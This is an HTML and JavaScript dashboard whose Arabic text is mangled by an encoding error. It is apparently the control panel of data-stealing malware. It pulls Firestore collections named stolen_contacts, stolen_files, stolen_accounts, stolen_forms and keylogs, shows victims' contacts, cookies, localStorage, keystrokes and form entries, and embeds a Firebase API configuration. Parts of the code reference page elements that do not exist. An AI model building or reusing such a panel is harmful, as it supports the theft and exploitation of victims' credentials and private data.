<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©</title>
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
<!-- Netlify Identity Widget -->
<script type="text/javascript" src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .dashboard-container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: white;
            padding: 25px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 600;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 25px;
            background: #f8f9fa;
        }

        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            text-align: center;
            border-left: 4px solid #3498db;
        }

        .stat-card.contacts { border-left-color: #e74c3c; }
        .stat-card.files { border-left-color: #f39c12; }
        .stat-card.accounts { border-left-color: #9b59b6; }
        .stat-card.sessions { border-left-color: #1abc9c; }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: #2c3e50;
            margin: 10px 0;
        }

        .stat-label {
            color: #7f8c8d;
            font-size: 14px;
            font-weight: 500;
        }

        .data-sections {
            padding: 25px;
        }

        .section {
            background: white;
            margin-bottom: 25px;
            border-radius: 12px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            overflow: hidden;
        }

        .section-header {
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            padding: 18px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .section-header h2 {
            font-size: 20px;
            font-weight: 500;
        }

        .section-content {
            padding: 20px;
            max-height: 400px;
            overflow-y: auto;
        }

        .data-item {
            background: #f8f9fa;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 3px solid #3498db;
        }

        .data-item.contact { border-left-color: #e74c3c; }
        .data-item.file { border-left-color: #f39c12; }
        .data-item.account { border-left-color: #9b59b6; }

        .data-item-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        .data-item-title {
            font-weight: 600;
            color: #2c3e50;
        }

        .data-item-meta {
            font-size: 12px;
            color: #7f8c8d;
        }

        .data-item-content {
            color: #34495e;
            font-size: 14px;
            line-height: 1.5;
        }

        .timestamp {
            font-size: 11px;
            color: #95a5a6;
            text-align: right;
            margin-top: 5px;
        }

        .filters {
            background: #f8f9fa;
            padding: 15px 25px;
            border-bottom: 1px solid #e9ecef;
            display: flex;
            gap: 15px;
            align-items: center;
        }

        .filter-select {
            padding: 8px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            background: white;
            font-size: 14px;
        }

        .search-box {
            flex: 1;
            padding: 8px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }

        .refresh-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: #7f8c8d;
        }

        .no-data {
            text-align: center;
            padding: 40px;
            color: #bdc3c7;
            font-style: italic;
        }

        /* ØªØ®ØµÙŠØµ Ø³ÙƒØ±ÙˆÙ„ Ø¨Ø§Ø± */
        .section-content::-webkit-scrollbar {
            width: 6px;
        }

        .section-content::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 3px;
        }

        .section-content::-webkit-scrollbar-thumb {
            background: #c1c1c1;
            border-radius: 3px;
        }

        .section-content::-webkit-scrollbar-thumb:hover {
            background: #a8a8a8;
        }
    </style>
</head>
<body>
    <div class="dashboard-container">
        <!-- Ø§Ù„Ù‡ÙŠØ¯Ø± -->
        <div class="header">
            <h1>ğŸ“Š Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªÙ„Ù…Ø©</h1>
            <div class="header-info">
                <div id="current-time" style="font-size: 14px; opacity: 0.9;"></div>
            </div>
        </div>

        <!-- Ø§Ù„ÙÙ„Ø§ØªØ± ÙˆØ§Ù„Ø¨Ø­Ø« -->
        <div class="filters">
            <select class="filter-select" id="time-filter">
                <option value="all">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</option>
                <option value="today">Ø§Ù„ÙŠÙˆÙ…</option>
                <option value="week">Ø£Ø³Ø¨ÙˆØ¹</option>
                <option value="month">Ø´Ù‡Ø±</option>
            </select>
            <input type="text" class="search-box" id="search-input" placeholder="ğŸ” Ø§Ø¨Ø­Ø« ÙÙŠ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...">
            <button class="refresh-btn" onclick="loadAllData()">ğŸ”„ ØªØ­Ø¯ÙŠØ«</button>
        </div>

        <!-- Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª -->
        <div class="stats-grid">
            <div class="stat-card contacts">
                <div class="stat-label">Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„</div>
                <div class="stat-number" id="contacts-count">0</div>
                <div class="stat-subtitle">Ø¬Ù‡Ø© Ø§ØªØµØ§Ù„</div>
            </div>
            <div class="stat-card files">
                <div class="stat-label">Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ±</div>
                <div class="stat-number" id="files-count">0</div>
                <div class="stat-subtitle">Ù…Ù„Ù</div>
            </div>
            <div class="stat-card accounts">
                <div class="stat-label">Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª</div>
                <div class="stat-number" id="accounts-count">0</div>
                <div class="stat-subtitle">Ø­Ø³Ø§Ø¨</div>
            </div>
            <div class="stat-card sessions">
                <div class="stat-label">Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù†Ø´Ø·Ø©</div>
                <div class="stat-number" id="sessions-count">0</div>
                <div class="stat-subtitle">Ø¬Ù„Ø³Ø©</div>
            </div>
        </div>

        <!-- Ø£Ù‚Ø³Ø§Ù… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª -->
        <div class="data-sections">
            <!-- Ù‚Ø³Ù… Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ -->
            <div class="section">
                <div class="section-header">
                    <h2>ğŸ‘¥ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø³Ø±ÙˆÙ‚Ø©</h2>
                    <span class="stat-badge" id="contacts-badge">0</span>
                </div>
                <div class="section-content" id="contacts-list">
                    <div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„...</div>
                </div>
            </div>

            <!-- Ù‚Ø³Ù… Ø§Ù„Ù…Ù„ÙØ§Øª -->
            <div class="section">
                <div class="section-header">
                    <h2>ğŸ“ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø³Ø±ÙˆÙ‚Ø©</h2>
                    <span class="stat-badge" id="files-badge">0</span>
                </div>
                <div class="section-content" id="files-list">
                    <div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª...</div>
                </div>
            </div>

            <!-- Ù‚Ø³Ù… Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª -->
            <div class="section">
                <div class="section-header">
                    <h2>ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª Ø§Ù„Ù…Ø³Ø±ÙˆÙ‚Ø©</h2>
                    <span class="stat-badge" id="accounts-badge">0</span>
                </div>
                <div class="section-content" id="accounts-list">
                    <div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª...</div>
                </div>
            </div>

            <!-- Ù‚Ø³Ù… Ø§Ù„Ø¬Ù„Ø³Ø§Øª -->
            <div class="section">
                <div class="section-header">
                    <h2>ğŸŒ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù†Ø´Ø·Ø©</h2>
                    <span class="stat-badge" id="sessions-badge">0</span>
                </div>
                <div class="section-content" id="sessions-list">
                    <div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ========== Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Firebase ==========
        const firebaseConfig = {
            apiKey: "AIzaSyB7uWrWJ1v_o3fqx0442wIkrAfTnPn84Mo",
            authDomain: "unseen-93dd8.firebaseapp.com",
            projectId: "unseen-93dd8",
            storageBucket: "unseen-93dd8.firebasestorage.app",
            messagingSenderId: "142670337449",
            appId: "1:142670337449:web:f41e9b5ebbb433378060b8",
            measurementId: "G-SPL7YN9LZ1"
        };

        // ØªÙ‡ÙŠØ¦Ø© Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();
        const storage = firebase.storage();

        // ========== Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø© ==========
        let allContacts = [];
        let allFiles = [];
        let allAccounts = [];
        let allSessions = [];

        // ========== Ø¯ÙˆØ§Ù„ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ==========
        async function loadAllData() {
            try {
                // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø£ÙˆÙ„Ø§Ù‹
        const isAuthenticated = await authenticateAdmin();
        if (!isAuthenticated) return;
                
                await Promise.all([
            loadContacts(),
            loadFiles(), 
            loadAccounts(),
            loadKeylogs(),
            loadFormData(),
            loadAppContacts()
        ]);
        updateStats();
        updateTime();
    } catch (error) {
        console.error('Error loading data:', error);
        showError('ÙØ´Ù„ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ' + error.message);
    }
}
                

// âœ… Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ù„Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª
async function loadAppContacts() {
    try {
        const snapshot = await db.collection('stolen_app_contacts')
            .orderBy('timestamp', 'desc')
            .limit(20)
            .get();

        const appContactsList = document.getElementById('app-contacts-list');
        if (!appContactsList) return;

        appContactsList.innerHTML = '';

        if (snapshot.empty) {
            appContactsList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ Ù…Ù† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª</div>';
            return;
        }
        snapshot.forEach(doc => {
            const appContact = doc.data();
            const appContactElement = `
                <div class="data-item">
                    <div class="data-item-header">
                        <div class="data-item-title">${appContact.app || 'ØªØ·Ø¨ÙŠÙ‚ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                        <div class="data-item-meta">Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„</div>
                    </div>
                    <div class="data-item-content">
                        ${appContact.data ? JSON.stringify(appContact.data).substring(0, 100) + '...' : 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª'}
                    </div>
                    <div class="timestamp">
                        ${formatTimestamp(appContact.timestamp)}
                    </div>
                </div>
            `;
            appContactsList.innerHTML += appContactElement;
        });

    } catch (error) {
        console.error('Error loading app contacts:', error);
    }
}
        // ØªØ­Ù…ÙŠÙ„ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
        async function loadContacts() {
            const contactsList = document.getElementById('contacts-list');
            contactsList.innerHTML = '<div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„...</div>';

            try {
                const snapshot = await db.collection('stolen_contacts')
                    .orderBy('timestamp', 'desc')
                    .limit(50)
                    .get();

                allContacts = [];
                contactsList.innerHTML = '';

                if (snapshot.empty) {
                    contactsList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ Ù…Ø³Ø±ÙˆÙ‚Ø©</div>';
                    return;
                }

                snapshot.forEach(doc => {
                    const contact = doc.data();
                    allContacts.push(contact);
                    
                    const contactElement = `
                        <div class="data-item contact">
                    <div class="data-item-header">
                        <div class="data-item-title">${contact.name || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                        <div class="data-item-meta">${contact.phones?.[0] || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø±Ù‚Ù…'}</div>
                    </div>
                    <div class="data-item-content">
                        ${contact.emails?.length ? `ğŸ“§ ${contact.emails[0]}<br>` : ''}
                        ${contact.address ? `ğŸ“ ${contact.address}` : ''}
                    </div>
                    <div class="timestamp">
                        ${formatTimestamp(contact.timestamp)}
                    </div>
                </div>
                    `;
                    contactsList.innerHTML += contactElement;
                });

                } catch (error) {
        console.error('Error loading contacts:', error);
        contactsList.innerHTML = '<div class="no-data">âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„</div>';
    }
}

        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª
        async function loadFiles() {
            const filesList = document.getElementById('files-list');
            filesList.innerHTML = '<div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª...</div>';

            try {
                const snapshot = await db.collection('stolen_files')
                    .orderBy('timestamp', 'desc')
                    .limit(30)
                    .get();

                allFiles = [];
                filesList.innerHTML = '';

                if (snapshot.empty) {
                    filesList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ù…Ù„ÙØ§Øª Ù…Ø³Ø±ÙˆÙ‚Ø©</div>';
                    return;
                }

                snapshot.forEach(doc => {
                    const file = doc.data();
                    allFiles.push(file);
                    
                    const fileElement = `
                        <div class="data-item file">
                            <div class="data-item-header">
                                <div class="data-item-title">${file.filename || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                                <div class="data-item-meta">${formatFileSize(file.size)}</div>
                            </div>
                            <div class="data-item-content">
                                Ø§Ù„Ù†ÙˆØ¹: ${file.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}<br>
                                ${file.data ? `Ø§Ù„Ø­Ø¬Ù…: ${file.data.length} Ø¨Ø§ÙŠØª` : ''}
                            </div>
                            <div class="timestamp">
                                ${formatTimestamp(file.timestamp)}
                            </div>
                        </div>
                    `;
                    filesList.innerHTML += fileElement;
                });

            } catch (error) {
                filesList.innerHTML = '<div class="no-data">âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª</div>';
            }
        }

        // ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª
        async function loadAccounts() {
            const accountsList = document.getElementById('accounts-list');
            accountsList.innerHTML = '<div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª...</div>';

            try {
                const snapshot = await db.collection('stolen_accounts')
                    .orderBy('timestamp', 'desc')
                    .limit(20)
                    .get();

                allAccounts = [];
                accountsList.innerHTML = '';

                if (snapshot.empty) {
                    accountsList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø­Ø³Ø§Ø¨Ø§Øª Ù…Ø³Ø±ÙˆÙ‚Ø©</div>';
                    return;
                }

                snapshot.forEach(doc => {
                    const account = doc.data();
                    allAccounts.push(account);
                    
                    const accountElement = `
                        <div class="data-item account">
                            <div class="data-item-header">
                                <div class="data-item-title">${account.userAgent?.substring(0, 50) || 'Ø¬Ù‡Ø§Ø² ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                                <div class="data-item-meta">${account.locationInfo?.hostname || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                            </div>
                            <div class="data-item-content">
                                ${account.cookies ? `ğŸª ${account.cookies.length} ÙƒÙˆÙƒÙŠØ²<br>` : ''}
                                ${account.localStorage ? `ğŸ’¾ ${Object.keys(account.localStorage).length} Ø¹Ù†ØµØ±<br>` : ''}
                                ${account.screenInfo ? `ğŸ“± ${account.screenInfo.width}x${account.screenInfo.height}` : ''}
                            </div>
                            <div class="timestamp">
                                ${formatTimestamp(account.timestamp)}
                            </div>
                        </div>
                    `;
                    accountsList.innerHTML += accountElement;
                });

            } catch (error) {
                accountsList.innerHTML = '<div class="no-data">âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø¨Ø§Øª</div>';
            }
        }

        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª
        async function loadSessions() {
            const sessionsList = document.getElementById('sessions-list');
            sessionsList.innerHTML = '<div class="loading">â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª...</div>';

            try {
                const snapshot = await db.collection('active_sessions')
                    .orderBy('lastActive', 'desc')
                    .limit(15)
                    .get();

                allSessions = [];
                sessionsList.innerHTML = '';

                if (snapshot.empty) {
                    sessionsList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¬Ù„Ø³Ø§Øª Ù†Ø´Ø·Ø©</div>';
                    return;
                }

                snapshot.forEach(doc => {
                    const session = doc.data();
                    allSessions.push(session);
                    
                    const sessionElement = `
                        <div class="data-item">
                            <div class="data-item-header">
                                <div class="data-item-title">${session.ipAddress || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                                <div class="data-item-meta">${session.device || 'Ø¬Ù‡Ø§Ø² ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                            </div>
                            <div class="data-item-content">
                                ${session.browser || 'Ù…ØªØµÙØ­ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}<br>
                                ${session.location || 'Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
                            </div>
                            <div class="timestamp">
                                Ø¢Ø®Ø± Ù†Ø´Ø§Ø·: ${formatTimestamp(session.lastActive)}
                            </div>
                        </div>
                    `;
                    sessionsList.innerHTML += sessionElement;
                });

            } catch (error) {
                sessionsList.innerHTML = '<div class="no-data">âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª</div>';
            }
        }

        // ========== Ø¯ÙˆØ§Ù„ Ù…Ø³Ø§Ø¹Ø¯Ø© ==========
        function updateStats() {
            document.getElementById('contacts-count').textContent = allContacts.length;
            document.getElementById('files-count').textContent = allFiles.length;
            document.getElementById('accounts-count').textContent = allAccounts.length;
            document.getElementById('sessions-count').textContent = allSessions.length;
            
            document.getElementById('contacts-badge').textContent = allContacts.length;
            document.getElementById('files-badge').textContent = allFiles.length;
            document.getElementById('accounts-badge').textContent = allAccounts.length;
            document.getElementById('sessions-badge').textContent = allSessions.length;
        }

        function formatPhone(phone) {
            if (!phone) return 'Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø±Ù‚Ù…';
            return phone.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3');
        }

        function formatFileSize(bytes) {
            if (!bytes) return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            const sizes = ['Ø¨Ø§ÙŠØª', 'Ùƒ.Ø¨Ø§ÙŠØª', 'Ù….Ø¨Ø§ÙŠØª', 'Ø¬.Ø¨Ø§ÙŠØª'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return Math.round(bytes / Math.pow(1024, i)) + ' ' + sizes[i];
        }

        function formatTimestamp(timestamp) {
            if (!timestamp) return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            const date = timestamp.toDate();
            return date.toLocaleString('ar-EG');
        }

        function updateTime() {
            const now = new Date();
            document.getElementById('current-time').textContent = 
                `Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«: ${now.toLocaleString('ar-EG')}`;
        }

        function showError(message) {
            alert(`âŒ ${message}`);
        }

        // ========== Ø§Ù„Ø¨Ø­Ø« ÙˆØ§Ù„ØªØµÙÙŠØ© ==========
        document.getElementById('search-input').addEventListener('input', function(e) {
            const searchTerm = e.target.value.toLowerCase();
            filterData(searchTerm);
        });

        document.getElementById('time-filter').addEventListener('change', function(e) {
            filterByTime(e.target.value);
        });

        function filterData(searchTerm) {
            // ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            // ... ÙƒÙˆØ¯ Ø§Ù„ØªØµÙÙŠØ© ...
        }

        function filterByTime(timeRange) {
            // ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ØªØµÙÙŠØ© Ø§Ù„Ø²Ù…Ù†ÙŠØ©
            // ... ÙƒÙˆØ¯ Ø§Ù„ØªØµÙÙŠØ© Ø§Ù„Ø²Ù…Ù†ÙŠØ© ...
        }

        // ========== Ø§Ù„ØªÙ‡ÙŠØ¦Ø© ==========
        document.addEventListener('DOMContentLoaded', function() {
            // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£ÙˆÙ„ÙŠ
            loadAllData();
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆÙ‚Øª ÙƒÙ„ Ø¯Ù‚ÙŠÙ‚Ø©
            setInterval(updateTime, 60000);
            
            // ØªØ­Ø¯ÙŠØ« ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ©
            setInterval(loadAllData, 30000);
        });

        // ========== Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ ==========
        async function authenticateAdmin() {
            try {
        // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ØªÙ‡ÙŠØ¦Ø© Netlify Identity
        await new Promise((resolve) => {
            const checkReady = setInterval(() => {
                if (window.netlifyIdentity) {
                    clearInterval(checkReady);
                    resolve();
                }
            }, 100);
        });

        const user = netlifyIdentity.currentUser();
        
        if (!user) {
            showError('ÙŠØ¬Ø¨ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø£ÙˆÙ„Ø§Ù‹');
            netlifyIdentity.open();
            return false;
        }
                       // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„
        const userDoc = await db.collection('users').doc(user.id).get();
        
        if (!userDoc.exists || !userDoc.data().isAdmin) {
            showError('Ù„ÙŠØ³ Ù„Ø¯ÙŠÙƒ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…');
            window.location.href = 'index.html';
            return false;
        }

        console.log('âœ… ØªÙ… Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­');
        return true;
        
    } catch (error) {
        console.error('Authentication failed:', error);
        showError('ÙØ´Ù„ ÙÙŠ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©');
        return false;
    }
} 

        // ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        authenticateAdmin();
// âœ… Ø¥Ø¶Ø§ÙØ© collections Ø¬Ø¯ÙŠØ¯Ø©
async function loadKeylogs() {
    try {
        const snapshot = await db.collection('keylogs')
            .orderBy('timestamp', 'desc')
            .limit(30)
            .get();

        const keylogsList = document.getElementById('keylogs-list');
        keylogsList.innerHTML = '';

        if (snapshot.empty) {
            keylogsList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª ÙƒØªØ§Ø¨Ø©</div>';
            return;
        }
        snapshot.forEach(doc => {
            const keylog = doc.data();
            const keylogElement = `
                <div class="data-item">
                    <div class="data-item-header">
                        <div class="data-item-title">Ø³Ø¬Ù„ ÙƒØªØ§Ø¨Ø©</div>
                        <div class="data-item-meta">${keylog.url || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                    </div>
                    <div class="data-item-content">
                        ${keylog.keys || 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª'}
                    </div>
                    <div class="timestamp">
                        ${formatTimestamp(keylog.timestamp)}
                    </div>
                </div>
            `;
            keylogsList.innerHTML += keylogElement;
        });
         } catch (error) {
        console.error('Error loading keylogs:', error);
    }
}

async function loadFormData() {
    try {
        const snapshot = await db.collection('stolen_forms')
            .orderBy('timestamp', 'desc')
            .limit(20)
            .get();

        const formsList = document.getElementById('forms-list');
        formsList.innerHTML = '';

        if (snapshot.empty) {
            formsList.innerHTML = '<div class="no-data">Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ù†Ù…Ø§Ø°Ø¬</div>';
            return;
                    }

        snapshot.forEach(doc => {
            const form = doc.data();
            const formElement = `
                <div class="data-item">
                    <div class="data-item-header">
                        <div class="data-item-title">Ù†Ù…ÙˆØ°Ø¬ Ù…Ù† ${form.url || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</div>
                        <div class="data-item-meta">${form.action || 'Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¥Ø¬Ø±Ø§Ø¡'}</div>
                    </div>
                    <div class="data-item-content">
                        ${JSON.stringify(form.data) || 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª'}
                    </div>
                    <div class="timestamp">
                        ${formatTimestamp(form.timestamp)}
                    </div>
                </div>
            `;
            formsList.innerHTML += formElement;
        });

    } catch (error) {
        console.error('Error loading form data:', error);
    }
}
    </script>
</body>
</html>
